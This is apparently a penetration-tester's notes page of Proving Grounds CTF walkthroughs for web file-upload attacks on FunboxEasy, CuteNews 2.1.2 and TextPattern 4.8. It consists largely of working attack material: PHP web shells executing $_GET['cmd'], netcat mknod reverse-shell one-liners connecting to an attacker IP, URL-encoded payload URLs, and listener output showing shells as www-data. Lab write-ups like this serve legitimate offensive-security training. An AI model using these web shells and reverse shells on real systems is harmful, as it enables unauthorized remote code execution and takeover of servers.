---
layout: default
title: File Upload (Web)
parent: Web Exploits
nav_order: 4
---

# File Upload via Web UI

---

## Generic File Upload to LFI Reverse Shell

Authenticate to _admin.php_ portal with discovered credentials.

![auth](../../../../assets/images/ctfs/proving_grounds/funboxeasy/auth.png)

Edit a book...

![edit](../../../../assets/images/ctfs/proving_grounds/funboxeasy/edit.png)

Upload a PHP command shell file using the Image file option.

![upload](../../../../assets/images/ctfs/proving_grounds/funboxeasy/upload.png)

```bash
# Create file test.php with the following web shell code

<?php
echo "<pre>";
passthru($_GET['cmd']);
echo "</pre>";
?>

```

Images are placed in the _/img_ directory.
Test PHP shell RCE functionality.

![cmd](../../../../assets/images/ctfs/proving_grounds/funboxeasy/cmd.png)

Now that we have a PHP command shell uploaded let get a revere shell.

Use _revshellgen_ and _urlencode_ to get a url encoded mk-nod reverse shell one-liner.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod | tail -n 1
rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Run the reverse shell one-liner and get a reverse shell on our netcat listener.

```bash
URL: 192.168.222.111/store/bootstrap/img/test.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/funboxeasy]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.222.111] 39914
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## CuteNews 2.1.2 - Authenticated Arbitrary File Upload

[Exploit Database CuteNews 2.1.2 exploit for authenticated arbitrary file upload.](https://www.exploit-db.com/exploits/48458)

Copy Pentest Monkey reverse shell to the current directory.
Edit to attach machine parameters and include _GIF8;_ at the top of the script.

![rev_shell](../../../../assets/images/ctfs/proving_grounds/bbscute/rev_shell.png)

Upload the file to the registered user's avatar.

![avatar](../../../../assets/images/ctfs/proving_grounds/bbscute/avatar.png)

As soon as we regresh the registered user's personal options page we have a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/bbscute]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.222.128] 52280
Linux cute.calipendula 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 03:15:02 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## TextPattern CMS 4.8

Reviewing _searchsploit_ for exploits on _Textpattern 4.8_ we have the following options:

```bash
# Exploit Title : TextPattern CMS 4.8.7 - Remote Command Execution (Authenticated)
# Date : 2021/09/06
# Exploit Author : Mert Da<C5><9F> merterpreter@gmail.com
# Software Link : https://textpattern.com/file_download/113/textpattern-4.8.7.zip
# Software web : https://textpattern.com/
# Tested on: Server : Xampp

First of all we should use file upload section to upload our shell.
Our shell contains this malicious code: <?PHP system($_GET['cmd']);?>

1) Go to content section .
2) Click Files and upload malicious php file.
3) go to yourserver/textpattern/files/yourphp.php?cmd=yourcode;

After upload our file , our request and respons is like below :

```

Create PHP CMD shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ vim cmd.php

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ cat cmd.php
<?php

system($_GET['cmd'])

?>

```

Upload to the target.

![upload](../../../../assets/images/ctfs/proving_grounds/driftingblues6/upload.png)

Run a test command and verify RCE.

![cmd](../../../../assets/images/ctfs/proving_grounds/driftingblues6/cmd.png)

Use _revshellgen_ to generate a bash one-liner on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

# Execute the following URL

URL: http://192.168.160.219/textpattern/files/cmd.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

# Get a reverse shell

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/driftingblues]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.160.219] 33206
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
